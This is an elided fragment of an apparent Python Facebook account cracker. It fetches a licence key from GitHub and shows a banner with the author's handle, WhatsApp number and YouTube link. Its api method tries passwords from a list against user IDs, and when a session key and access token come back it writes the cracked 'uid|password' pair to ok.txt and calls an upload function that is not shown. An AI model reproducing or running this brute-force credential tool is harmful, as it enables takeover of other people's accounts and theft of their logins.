...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/AfghanHack001/Muslim/main/public.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;96m##     ## ##     ## ##     ## #### #### 
 ...
 > \033[0;95mFACEBOOK      : MRr Elyas
 > \033[0;41mWHATSAPP      : +93787389807
 \033[0;96m> YOUTUBE       : ...
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [BLACK-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
